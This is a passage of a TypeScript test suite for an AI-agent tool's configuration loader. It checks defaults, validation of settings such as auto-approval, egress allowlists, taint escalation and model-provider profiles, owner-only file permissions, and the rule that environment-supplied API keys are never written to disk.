    expect(raw.endsWith('\n')).toBe(true);
    expect(raw).toContain('  "agentModelId"');
  });

  it('preserves unknown fields in the file during backfill', () => {
    writeConfigFile({
      agentModelId: 'claude-opus-4-6',
      customField: 'keep-me',
    });

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    expect(onDisk.customField).toBe('keep-me');
  });

  it('preserves explicit null values in nested objects during backfill', () => {
    writeRawConfigFile(
      JSON.stringify(
        {
          resourceBudget: { maxSteps: null, maxTotalTokens: 500000 },
        },
        null,
        2,
      ),
    );

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    const budget = onDisk.resourceBudget as Record<string, unknown>;
    expect(budget.maxSteps).toBeNull();
    expect(budget.maxTotalTokens).toBe(500000);
    expect(budget.warnThresholdPercent).toBe(USER_CONFIG_DEFAULTS.resourceBudget.warnThresholdPercent);
  });

  // --- autoApprove config ---

  it('default config has autoApprove.enabled === false', () => {
    const config = loadUserConfig();

    expect(config.autoApprove.enabled).toBe(false);
    expect(config.autoApprove.modelId).toBe(USER_CONFIG_DEFAULTS.autoApprove.modelId);
  });

  it('reads autoApprove enabled and modelId from config file', () => {
    writeConfigFile({
      autoApprove: { enabled: true, modelId: 'anthropic:claude-haiku-4-5' },
    });

    const config = loadUserConfig();

    expect(config.autoApprove.enabled).toBe(true);
    expect(config.autoApprove.modelId).toBe('anthropic:claude-haiku-4-5');
  });

  it('merges partial autoApprove with defaults', () => {
    writeConfigFile({
      autoApprove: { enabled: true },
    });

    const config = loadUserConfig();

    expect(config.autoApprove.enabled).toBe(true);
    expect(config.autoApprove.modelId).toBe(USER_CONFIG_DEFAULTS.autoApprove.modelId);
  });

  it('rejects autoApprove with invalid modelId', () => {
    writeConfigFile({
      autoApprove: { enabled: true, modelId: 'unknown:model' },
    });

    expect(() => loadUserConfig()).toThrow(/provider/i);
  });

  it('backfills autoApprove section when missing from existing config', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    expect(onDisk.autoApprove).toEqual(USER_CONFIG_DEFAULTS.autoApprove);
  });

  it('backfills missing sub-fields in existing autoApprove object', () => {
    writeConfigFile({ autoApprove: { enabled: true } });

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    const autoApprove = onDisk.autoApprove as Record<string, unknown>;
    expect(autoApprove.enabled).toBe(true);
    expect(autoApprove.modelId).toBe(USER_CONFIG_DEFAULTS.autoApprove.modelId);
  });

  it('skips backfill on invalid JSON (file unchanged)', () => {
    const invalidJson = '{ invalid json }';
    writeRawConfigFile(invalidJson);

    expect(() => loadUserConfig()).toThrow(/Invalid JSON/);

    const raw = readFileSync(resolve(testHome, 'config.json'), 'utf-8');
    expect(raw).toBe(invalidJson);
  });

  // ── webSearch tests ────────────────────────────────────────────────

  it('valid webSearch parses correctly', () => {
    writeConfigFile({
      webSearch: {
        provider: 'brave',
        brave: { apiKey: 'test-brave-key' },
      },
    });

    const config = loadUserConfig();
    expect(config.webSearch.provider).toBe('brave');
    expect(config.webSearch.brave).toEqual({ apiKey: 'test-brave-key' });
  });

  it('invalid webSearch provider is rejected', () => {
    writeRawConfigFile(JSON.stringify({ webSearch: { provider: 'bing' } }, null, 2));

    expect(() => loadUserConfig()).toThrow();
  });

  it('empty webSearch API key is rejected', () => {
    writeConfigFile({
      webSearch: {
        provider: 'brave',
        brave: { apiKey: '' },
      },
    });

    expect(() => loadUserConfig()).toThrow();
  });

  it('webSearch not backfilled (in SENSITIVE_FIELDS)', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    loadUserConfig();

    const onDisk = readConfigFromDisk();
    expect(onDisk.webSearch).toBeUndefined();
  });

  it('webSearch defaults produce provider: null', () => {
    const config = loadUserConfig();

    expect(config.webSearch.provider).toBeNull();
    expect(config.webSearch.brave).toBeNull();
    expect(config.webSearch.tavily).toBeNull();
    expect(config.webSearch.serpapi).toBeNull();
  });

  // ── fetch tests ────────────────────────────────────────────────────

  it('fetch.allowPrivateNetworks defaults to false', () => {
    expect(loadUserConfig().fetch).toEqual({ allowPrivateNetworks: false });

    writeConfigFile({ fetch: {} });
    expect(loadUserConfig().fetch).toEqual({ allowPrivateNetworks: false });
  });

  it('fetch.allowPrivateNetworks reads an explicit opt-in', () => {
    writeConfigFile({ fetch: { allowPrivateNetworks: true } });

    expect(loadUserConfig().fetch).toEqual({ allowPrivateNetworks: true });
  });

  it('fetch.allowPrivateNetworks must be a boolean', () => {
    writeConfigFile({ fetch: { allowPrivateNetworks: 'yes' } });

    expect(() => loadUserConfig()).toThrow();
  });

  // ── taintEscalation tests ──────────────────────────────────────────

  it('taintEscalation is off unless the config file enables it', () => {
    expect(loadUserConfig().taintEscalation).toEqual({ enabled: false, tools: {} });

    writeConfigFile({ taintEscalation: {} });
    expect(loadUserConfig().taintEscalation).toEqual({ enabled: false, tools: {} });
  });

  it('taintEscalation reads the opt-in and per-tool classes', () => {
    writeConfigFile({
      taintEscalation: {
        enabled: true,
        tools: { 'slack/post_message': 'sink', 'slack/*': 'source', 'google-workspace/gsheets_format_cells': 'none' },
      },
    });

    expect(loadUserConfig().taintEscalation).toEqual({
      enabled: true,
      tools: { 'slack/post_message': 'sink', 'slack/*': 'source', 'google-workspace/gsheets_format_cells': 'none' },
    });
  });

  it('taintEscalation rejects malformed keys, unknown classes and misspelled fields', () => {
    for (const taintEscalation of [
      { enabled: 'yes' },
      { enabled: true, tools: { gmail_send_message: 'sink' } },
      { enabled: true, tools: { 'github/*_write': 'sink' } },
      { enabled: true, tools: { 'github/add_issue_comment': 'outbound' } },
      // A typo must not leave the protection silently off.
      { enable: true },
    ]) {
      writeConfigFile({ taintEscalation });
      expect(() => loadUserConfig(), JSON.stringify(taintEscalation)).toThrow(/taintEscalation/);
    }
  });

  it('taintEscalation is neither backfilled nor reported as an unknown field', () => {
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    try {
      writeConfigFile({ agentModelId: 'claude-opus-4-6' });
      loadUserConfig();
      expect(readConfigFromDisk().taintEscalation).toBeUndefined();

      writeConfigFile({ agentModelId: 'claude-opus-4-6', taintEscalation: { enabled: true } });
      loadUserConfig();
      expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('unknown field "taintEscalation"'));
    } finally {
      stderrSpy.mockRestore();
    }
  });

  it('fetch is neither backfilled nor reported as an unknown field', () => {
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    try {
      writeConfigFile({ agentModelId: 'claude-opus-4-6' });
      loadUserConfig();
      expect(readConfigFromDisk().fetch).toBeUndefined();

      writeConfigFile({ agentModelId: 'claude-opus-4-6', fetch: { allowPrivateNetworks: true } });
      loadUserConfig();
      expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('unknown field "fetch"'));
    } finally {
      stderrSpy.mockRestore();
    }
  });

  // ── policy tests ───────────────────────────────────────────────────

  it('policy.onStale defaults to warn and reads an explicit refuse', () => {
    expect(loadUserConfig().policy).toEqual({ onStale: 'warn' });

    writeConfigFile({ policy: { onStale: 'refuse' } });
    expect(loadUserConfig().policy).toEqual({ onStale: 'refuse' });
  });

  it('policy rejects an unknown onStale value and a misspelled key', () => {
    writeConfigFile({ policy: { onStale: 'ignore' } });
    expect(() => loadUserConfig()).toThrow(/policy\.onStale/);

    writeConfigFile({ policy: { onstale: 'refuse' } });
    expect(() => loadUserConfig()).toThrow(/policy/);
  });

  it('policy is neither backfilled nor reported as an unknown field', () => {
    const stderrSpy = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
    try {
      writeConfigFile({ agentModelId: 'claude-opus-4-6' });
      loadUserConfig();
      expect(readConfigFromDisk().policy).toBeUndefined();

      writeConfigFile({ agentModelId: 'claude-opus-4-6', policy: { onStale: 'refuse' } });
      loadUserConfig();
      expect(stderrSpy).not.toHaveBeenCalledWith(expect.stringContaining('unknown field "policy"'));
    } finally {
      stderrSpy.mockRestore();
    }
  });

  // ── egressPolicy tests (WP-118) ────────────────────────────────────

  it('egressPolicy is off by default and never backfilled', () => {
    expect(loadUserConfig().egressPolicy).toEqual({ enabled: false, allowedHosts: [] });
    expect(readConfigFromDisk().egressPolicy).toBeUndefined();

    writeConfigFile({ egressPolicy: {} });
    expect(loadUserConfig().egressPolicy).toEqual({ enabled: false, allowedHosts: [] });
  });

  it('egressPolicy reads the opt-in and canonicalizes allowedHosts', () => {
    writeConfigFile({
      egressPolicy: { enabled: true, allowedHosts: ['*.NPMJS.org', 'Bazel.Build.', 'bazel.build', '*'] },
    });

    expect(loadUserConfig().egressPolicy).toEqual({
      enabled: true,
      allowedHosts: ['*.npmjs.org', 'bazel.build', '*'],
    });
  });

  it.each(['10.0.0.1', 'localhost', '*.com', 'metadata.google.internal', 'example.com:443', 'https://example.com'])(
    'egressPolicy.allowedHosts rejects %j',
    (pattern) => {
      writeConfigFile({ egressPolicy: { enabled: true, allowedHosts: [pattern] } });

      expect(() => loadUserConfig()).toThrow(/egressPolicy\.allowedHosts/u);
    },
  );

  it('egressPolicy rejects a misspelled key instead of leaving egress unevaluated', () => {
    writeConfigFile({ egressPolicy: { enable: true } });

    expect(() => loadUserConfig()).toThrow(/egressPolicy/u);
  });

  // ── serverCredentials tests ─────────────────────────────────────────

  it('parses serverCredentials from config file', () => {
    writeConfigFile({
      serverCredentials: {
        git: { GH_TOKEN: 'ghp_xxxx' },
        fetch: { API_KEY: 'key_yyyy' },
      },
    });

    const config = loadUserConfig();
    expect(config.serverCredentials).toEqual({
      git: { GH_TOKEN: 'ghp_xxxx' },
      fetch: { API_KEY: 'key_yyyy' },
    });
  });

  it('defaults serverCredentials to empty object when absent', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    const config = loadUserConfig();
    expect(config.serverCredentials).toEqual({});
  });

  it('rejects empty credential values', () => {
    writeConfigFile({
      serverCredentials: { git: { GH_TOKEN: '' } },
    });

    expect(() => loadUserConfig()).toThrow();
  });

  it('does not backfill serverCredentials (in SENSITIVE_FIELDS)', () => {
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });

    loadUserConfig();

    const content = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(content.serverCredentials).toBeUndefined();
  });

  // ── Config file permissions tests ─────────────────────────────────

  it('creates config file with 0o600 permissions', () => {
    loadUserConfig();

    const configPath = resolve(testHome, 'config.json');
    const stats = statSync(configPath);
    expect(stats.mode & 0o777).toBe(0o600);
  });

  it('warns when config file is group- or world-readable', () => {
    // Pre-create config with insecure permissions
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });
    chmodSync(resolve(testHome, 'config.json'), 0o644);

    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);

    loadUserConfig();

    const calls = stderrSpy.mock.calls.map((c) => String(c[0]));
    expect(calls.some((c) => c.includes('readable by other users'))).toBe(true);
    stderrSpy.mockRestore();
  });

  it('does not warn when config file has 0o600 permissions', () => {
    // Pre-create config with secure permissions
    writeConfigFile({ agentModelId: 'claude-opus-4-6' });
    chmodSync(resolve(testHome, 'config.json'), 0o600);

    const stderrSpy = vi.spyOn(process.stderr, 'write').mockReturnValue(true);

    loadUserConfig();

    const calls = stderrSpy.mock.calls.map((c) => String(c[0]));
    expect(calls.some((c) => c.includes('readable by other users'))).toBe(false);
    stderrSpy.mockRestore();
  });

  // --- resourceBudget.modelPricing ---

  it('loads resourceBudget.modelPricing as model price overrides, apart from the limits', () => {
    writeConfigFile({
      resourceBudget: {
        maxSteps: 300,
        modelPricing: {
          'anthropic:claude-opus-9': { inputPerMillion: 6, outputPerMillion: 30, cacheReadPerMillion: 0.6 },
        },
      },
    });

    const config = loadUserConfig();
    expect(config.modelPricingOverrides).toEqual({
      'anthropic:claude-opus-9': { inputPerMillion: 6, outputPerMillion: 30, cacheReadPerMillion: 0.6 },
    });
    expect(config.resourceBudget.maxSteps).toBe(300);
    expect(config.resourceBudget).not.toHaveProperty('modelPricing');
    // Workflow resolution only takes the limit fields.
    const requested = loadRequestedResourceBudgetConfig();
    expect(requested.maxSteps).toBe(300);
    expect(requested).not.toHaveProperty('modelPricing');
  });

  it('defaults to no price overrides', () => {
    expect(loadUserConfig().modelPricingOverrides).toEqual({});
  });

  it.each([
    ['a negative price', { 'claude-opus-9': { inputPerMillion: -1, outputPerMillion: 5 } }],
    ['a missing output price', { 'claude-opus-9': { inputPerMillion: 1 } }],
    ['a misspelled field', { 'claude-opus-9': { inputPerMillion: 1, outputPerMillion: 5, cacheReadPerMilion: 0.1 } }],
  ])('rejects %s in resourceBudget.modelPricing', (_label, modelPricing) => {
    writeConfigFile({ resourceBudget: { modelPricing } });
    expect(() => loadUserConfig()).toThrow(/resourceBudget\.modelPricing/);
  });

  it('keeps prices out of the limit fields that workflows and the web UI may set', () => {
    const pricing = { modelPricing: { 'claude-opus-9': { inputPerMillion: 0, outputPerMillion: 0 } } };
    expect(resourceBudgetFieldsSchema.strict().safeParse(pricing).success).toBe(false);
  });

  // --- Test helpers ---

  function readConfigFromDisk(): Record<string, unknown> {
    return JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
  }

  function writeRawConfigFile(content: string): void {
    mkdirSync(testHome, { recursive: true });
    writeFileSync(resolve(testHome, 'config.json'), content);
  }

  function writeConfigFile(config: Record<string, unknown>): void {
    writeRawConfigFile(JSON.stringify(config, null, 2));
  }
});

describe('saveUserConfig', () => {
  let testHome: string;
  const savedEnv: Record<string, string | undefined> = {};

  beforeEach(() => {
    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-saveconfig-'));
    for (const key of ENV_VARS_TO_ISOLATE) {
      savedEnv[key] = process.env[key];
      delete process.env[key];
    }
    process.env.IRONCURTAIN_HOME = testHome;
  });

  afterEach(() => {
    for (const key of ENV_VARS_TO_ISOLATE) {
      if (savedEnv[key] !== undefined) {
        process.env[key] = savedEnv[key];
      } else {
        delete process.env[key];
      }
    }
    rmSync(testHome, { recursive: true, force: true });
  });

  it('creates config when none exists', () => {
    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });

    const onDisk = readConfigFromDisk();
    expect(onDisk.agentModelId).toBe('anthropic:claude-opus-4-6');
  });

  it('creates a missing save destination with owner-only permissions', () => {
    const missingHome = resolve(testHome, 'missing-home');
    process.env.IRONCURTAIN_HOME = missingHome;

    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });

    expect(statSync(missingHome).mode & 0o777).toBe(0o700);
  });

  it('merges new fields into existing config', () => {
    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });

    saveUserConfig({ policyModelId: 'google:gemini-2.5-flash' });

    const onDisk = readConfigFromDisk();
    expect(onDisk.agentModelId).toBe('anthropic:claude-sonnet-4-6');
    expect(onDisk.policyModelId).toBe('google:gemini-2.5-flash');
  });

  it('preserves existing fields not in changes', () => {
    writeConfigFile({
      agentModelId: 'anthropic:claude-sonnet-4-6',
      escalationTimeoutSeconds: 120,
    });

    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });

    const onDisk = readConfigFromDisk();
    expect(onDisk.agentModelId).toBe('anthropic:claude-opus-4-6');
    expect(onDisk.escalationTimeoutSeconds).toBe(120);
  });

  it('handles nested object merging (resourceBudget sub-fields)', () => {
    writeConfigFile({
      resourceBudget: { maxSteps: 100, maxTotalTokens: 500000 },
    });

    saveUserConfig({ resourceBudget: { maxSteps: 300 } });

    const onDisk = readConfigFromDisk();
    const budget = onDisk.resourceBudget as Record<string, unknown>;
    expect(budget.maxSteps).toBe(300);
    expect(budget.maxTotalTokens).toBe(500000);
  });

  it('keeps resourceBudget.modelPricing when the limits are saved', () => {
    const modelPricing = { 'claude-opus-9': { inputPerMillion: 6, outputPerMillion: 30 } };
    writeConfigFile({ resourceBudget: { maxSteps: 100, modelPricing } });

    saveUserConfig({ resourceBudget: { maxSteps: 300 } });

    const budget = readConfigFromDisk().resourceBudget as Record<string, unknown>;
    expect(budget.maxSteps).toBe(300);
    expect(budget.modelPricing).toEqual(modelPricing);
  });

  it('preserves null values for disabled budget fields', () => {
    writeConfigFile({
      resourceBudget: { maxSteps: 100 },
    });

    saveUserConfig({ resourceBudget: { maxSteps: null } });

    const onDisk = readConfigFromDisk();
    const budget = onDisk.resourceBudget as Record<string, unknown>;
    expect(budget.maxSteps).toBeNull();
  });

  it('validates before writing (rejects invalid model IDs)', () => {
    writeConfigFile({ agentModelId: 'anthropic:claude-sonnet-4-6' });

    expect(() => saveUserConfig({ agentModelId: 'unknown:bad-model' })).toThrow(/provider/i);

    // File should be unchanged
    const onDisk = readConfigFromDisk();
    expect(onDisk.agentModelId).toBe('anthropic:claude-sonnet-4-6');
  });

  it('preserves unknown fields in existing config', () => {
    writeConfigFile({
      agentModelId: 'anthropic:claude-sonnet-4-6',
      customField: 'keep-me',
    });

    saveUserConfig({ policyModelId: 'google:gemini-2.5-flash' });

    const onDisk = readConfigFromDisk();
    expect(onDisk.customField).toBe('keep-me');
    expect(onDisk.policyModelId).toBe('google:gemini-2.5-flash');
  });

  it('writes with 2-space indent and trailing newline', () => {
    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });

    const raw = readFileSync(resolve(testHome, 'config.json'), 'utf-8');
    expect(raw).toContain('  "agentModelId"');
    expect(raw.endsWith('\n')).toBe(true);
  });

  it('sets owner-only permissions (0600) on saved config file', () => {
    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });

    const configPath = resolve(testHome, 'config.json');
    const mode = statSync(configPath).mode & 0o777;
    expect(mode).toBe(0o600);
  });

  it('removes a section when saved with empty object (disable pattern)', () => {
    writeConfigFile({
      agentModelId: 'anthropic:claude-sonnet-4-6',
      webSearch: { provider: 'brave', brave: { apiKey: 'test-key' } },
    });

    // Empty object signals "delete this section" (used by config editor's Disable action)
    saveUserConfig({ webSearch: {} });

    const onDisk = readConfigFromDisk();
    expect(onDisk.webSearch).toBeUndefined();
    expect(onDisk.agentModelId).toBe('anthropic:claude-sonnet-4-6');
  });

  function readConfigFromDisk(): Record<string, unknown> {
    return JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
  }

  function writeConfigFile(config: Record<string, unknown>): void {
    mkdirSync(testHome, { recursive: true });
    writeFileSync(resolve(testHome, 'config.json'), JSON.stringify(config, null, 2));
  }
});

describe('preferredMode field', () => {
  let testHome: string;
  const savedEnv: Record<string, string | undefined> = {};

  beforeEach(() => {
    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-prefmode-'));
    for (const key of ENV_VARS_TO_ISOLATE) {
      savedEnv[key] = process.env[key];
      delete process.env[key];
    }
    process.env.IRONCURTAIN_HOME = testHome;
  });

  afterEach(() => {
    for (const key of ENV_VARS_TO_ISOLATE) {
      if (savedEnv[key] !== undefined) {
        process.env[key] = savedEnv[key];
      } else {
        delete process.env[key];
      }
    }
    rmSync(testHome, { recursive: true, force: true });
  });

  function writeConfigFile(config: Record<string, unknown>): void {
    mkdirSync(testHome, { recursive: true });
    writeFileSync(resolve(testHome, 'config.json'), JSON.stringify(config, null, 2));
  }

  it('defaults to "container" when not set', () => {
    const config = loadUserConfig();
    expect(config.preferredMode).toBe('container');
  });

  it('accepts "container"', () => {
    writeConfigFile({ preferredMode: 'container' });
    expect(loadUserConfig().preferredMode).toBe('container');
  });

  it('accepts legacy "docker" and normalizes it to "container"', () => {
    writeConfigFile({ preferredMode: 'docker' });
    expect(loadUserConfig().preferredMode).toBe('container');
  });

  it('normalizes legacy "docker" to "container" when saving changes', () => {
    writeConfigFile({ preferredMode: 'docker' });

    saveUserConfig({ agentModelId: 'anthropic:claude-opus-4-6' });

    const onDisk = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8')) as Record<string, unknown>;
    expect(onDisk.preferredMode).toBe('container');
  });

  it('accepts "builtin"', () => {
    writeConfigFile({ preferredMode: 'builtin' });
    expect(loadUserConfig().preferredMode).toBe('builtin');
  });

  it('rejects "auto" with a clear schema error', () => {
    writeConfigFile({ preferredMode: 'auto' });
    expect(() => loadUserConfig()).toThrow(/preferredMode/);
  });

  it('rejects unrelated string values', () => {
    writeConfigFile({ preferredMode: 'pty' });
    expect(() => loadUserConfig()).toThrow(/preferredMode/);
  });
});

describe('validateModelId', () => {
  it('returns undefined for valid model IDs', () => {
    expect(validateModelId('anthropic:claude-sonnet-4-6')).toBeUndefined();
    expect(validateModelId('google:gemini-2.5-flash')).toBeUndefined();
    expect(validateModelId('openai:gpt-4o')).toBeUndefined();
    expect(validateModelId('claude-sonnet-4-6')).toBeUndefined();
  });

  it('returns error message for invalid model IDs', () => {
    expect(validateModelId('unknown:model')).toBeDefined();
    expect(validateModelId('')).toBeDefined();
  });
});

// --- G1: modelProviders provider-profile registry (openrouter-integration §6/§12.1) ---

/** The §6 two-profile example config. */
const TWO_PROFILE_EXAMPLE = {
  modelProviders: {
    default: 'glm-5.2',
    profiles: {
      'glm-5.2': {
        type: 'openrouter',
        apiKey: 'sk-or-v1-REDACTED',
        modelMap: [
          { match: '*opus*', model: 'z-ai/glm-5.2' },
          { match: '*sonnet*', model: 'z-ai/glm-5.2' },
          { match: '*haiku*', model: 'z-ai/glm-5.2' },
        ],
        perAgent: { goose: 'z-ai/glm-5.2', codex: 'z-ai/glm-5.2' },
        providerPreference: { order: ['z-ai'], allowFallbacks: false },
        sessionAffinity: true,
      },
      kimi: {
        type: 'openrouter',
        modelMap: [{ match: '*', model: 'moonshot/kimi-k3' }],
      },
    },
  },
} as const;

describe('modelProviders schema (userConfigSchema.safeParse)', () => {
  it('accepts the §6 two-profile example', () => {
    const result = userConfigSchema.safeParse(TWO_PROFILE_EXAMPLE);
    expect(result.success).toBe(true);
  });

  it('rejects a modelMap entry with an empty match', () => {
    const result = userConfigSchema.safeParse({
      modelProviders: {
        profiles: { p: { type: 'openrouter', modelMap: [{ match: '', model: 'z-ai/glm-5.2' }] } },
      },
    });
    expect(result.success).toBe(false);
  });

  it('rejects a user-defined profile named "native" (reserved)', () => {
    const result = userConfigSchema.safeParse({
      modelProviders: { profiles: { native: { type: 'openrouter' } } },
    });
    expect(result.success).toBe(false);
    expect(JSON.stringify(result.error)).toContain('reserved');
  });

  it('rejects default naming a non-existent profile', () => {
    const result = userConfigSchema.safeParse({
      modelProviders: { default: 'ghost', profiles: { real: { type: 'openrouter' } } },
    });
    expect(result.success).toBe(false);
    expect(JSON.stringify(result.error)).toContain('must name a configured profile');
  });

  it('accepts default "native"', () => {
    const result = userConfigSchema.safeParse({ modelProviders: { default: 'native' } });
    expect(result.success).toBe(true);
  });

  it('accepts default naming a configured profile', () => {
    const result = userConfigSchema.safeParse({
      modelProviders: { default: 'glm-5.2', profiles: { 'glm-5.2': { type: 'openrouter' } } },
    });
    expect(result.success).toBe(true);
  });
});

describe('modelProviders resolution (loadUserConfig)', () => {
  let testHome: string;
  const savedEnv: Record<string, string | undefined> = {};
  const ENV_KEYS = ['IRONCURTAIN_HOME', 'OPENROUTER_API_KEY'] as const;

  beforeEach(() => {
    testHome = mkdtempSync(resolve(tmpdir(), 'ironcurtain-modelproviders-'));
    for (const key of ENV_KEYS) {
      savedEnv[key] = process.env[key];
      delete process.env[key];
    }
    process.env.IRONCURTAIN_HOME = testHome;
  });

  afterEach(() => {
    for (const key of ENV_KEYS) {
      if (savedEnv[key] !== undefined) process.env[key] = savedEnv[key];
      else delete process.env[key];
    }
    rmSync(testHome, { recursive: true, force: true });
  });

  function writeConfigFile(config: Record<string, unknown>): void {
    mkdirSync(testHome, { recursive: true });
    writeFileSync(resolve(testHome, 'config.json'), JSON.stringify(config, null, 2));
  }

  it('always includes the implicit native profile, even when modelProviders is absent', () => {
    const config = loadUserConfig();
    expect(config.modelProviders.profiles.native).toEqual({ type: 'native' });
  });

  it('default resolves to "native" when unset', () => {
    const config = loadUserConfig();
    expect(config.modelProviders.default).toBe('native');
  });

  it('resolves default from config when set', () => {
    writeConfigFile({ modelProviders: { default: 'glm-5.2', profiles: { 'glm-5.2': { type: 'openrouter' } } } });
    const config = loadUserConfig();
    expect(config.modelProviders.default).toBe('glm-5.2');
  });

  it('applies DEFAULT_MODEL_MAP to an openrouter profile with no modelMap', () => {
    writeConfigFile({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x' } } } });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.modelMap).toEqual(DEFAULT_MODEL_MAP);
  });

  it('preserves an explicit empty modelMap (D1 per-agent-only mode)', () => {
    writeConfigFile({
      modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x', modelMap: [] } } },
    });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.modelMap).toEqual([]);
  });

  it('sets usesDefaultMap true when the profile OMITS modelMap (default-tracking)', () => {
    writeConfigFile({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x' } } } });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.usesDefaultMap).toBe(true);
    expect(p.modelMap).toEqual(DEFAULT_MODEL_MAP);
  });

  it('sets usesDefaultMap false for an explicit empty modelMap (per-agent-only, not default)', () => {
    writeConfigFile({
      modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x', modelMap: [] } } },
    });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.usesDefaultMap).toBe(false);
  });

  it('sets usesDefaultMap false for an explicit non-empty modelMap', () => {
    writeConfigFile({
      modelProviders: {
        profiles: {
          p: { type: 'openrouter', apiKey: 'sk-or-v1-x', modelMap: [{ match: '*', model: 'z-ai/glm-5.2' }] },
        },
      },
    });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.usesDefaultMap).toBe(false);
  });

  it('defaults sessionAffinity to true when absent', () => {
    writeConfigFile({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x' } } } });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.sessionAffinity).toBe(true);
  });

  it('honors an explicit sessionAffinity=false', () => {
    writeConfigFile({
      modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x', sessionAffinity: false } } },
    });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.sessionAffinity).toBe(false);
  });

  it('resolves apiKey to "" when neither env nor config sets it', () => {
    writeConfigFile({ modelProviders: { profiles: { p: { type: 'openrouter' } } } });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.apiKey).toBe('');
  });

  it('OPENROUTER_API_KEY env beats every profile config apiKey', () => {
    writeConfigFile({
      modelProviders: {
        profiles: {
          a: { type: 'openrouter', apiKey: 'sk-or-v1-config-a' },
          b: { type: 'openrouter' },
        },
      },
    });
    process.env.OPENROUTER_API_KEY = 'sk-or-v1-from-env';
    const config = loadUserConfig();
    const a = config.modelProviders.profiles.a as ResolvedOpenRouterProfile;
    const b = config.modelProviders.profiles.b as ResolvedOpenRouterProfile;
    expect(a.apiKey).toBe('sk-or-v1-from-env');
    expect(b.apiKey).toBe('sk-or-v1-from-env');
  });

  it('uses the profile config apiKey when OPENROUTER_API_KEY is unset', () => {
    writeConfigFile({ modelProviders: { profiles: { a: { type: 'openrouter', apiKey: 'sk-or-v1-config-a' } } } });
    const config = loadUserConfig();
    const a = config.modelProviders.profiles.a as ResolvedOpenRouterProfile;
    expect(a.apiKey).toBe('sk-or-v1-config-a');
  });

  it('resolves perAgent overrides, leaving unset agents undefined', () => {
    writeConfigFile({
      modelProviders: {
        profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-x', perAgent: { goose: 'z-ai/glm-5.2' } } },
      },
    });
    const config = loadUserConfig();
    const p = config.modelProviders.profiles.p as ResolvedOpenRouterProfile;
    expect(p.perAgent.goose).toBe('z-ai/glm-5.2');
    expect(p.perAgent['claude-code']).toBeUndefined();
    expect(p.perAgent.codex).toBeUndefined();
  });

  it('does not back-fill modelProviders into the config file (computeMissingDefaults skips it)', () => {
    // Trigger auto-creation, then confirm no modelProviders key is written.
    loadUserConfig();
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.modelProviders).toBeUndefined();
  });

  it('persists an explicitly-set profile apiKey via saveUserConfig', () => {
    loadUserConfig();
    saveUserConfig({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-persist' } } } });
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.modelProviders.profiles.p.apiKey).toBe('sk-or-v1-persist');
  });

  it('never persists the OPENROUTER_API_KEY env value (env-only profile → apiKey omitted)', () => {
    // Simulates the editor/web-UI persisting a resolved profile whose apiKey was
    // injected only from the env var (applyOpenrouterKeyEnv) — it must not land on disk.
    process.env.OPENROUTER_API_KEY = 'sk-or-v1-from-env';
    saveUserConfig({ modelProviders: { profiles: { p: { type: 'openrouter', apiKey: 'sk-or-v1-from-env' } } } });
    const written = JSON.parse(readFileSync(resolve(testHome, 'config.json'), 'utf-8'));
    expect(written.modelProviders.profiles.p.apiKey).toBeUndefined();
    // Round-trips: the env var still supplies the key at load time.
    expect((loadUserConfig().modelProviders.profiles.p as ResolvedOpenRouterProfile).apiKey).toBe('sk-or-v1-from-env');
  });

  it('restores a distinct file-origin apiKey when scrubbing the env value', () => {
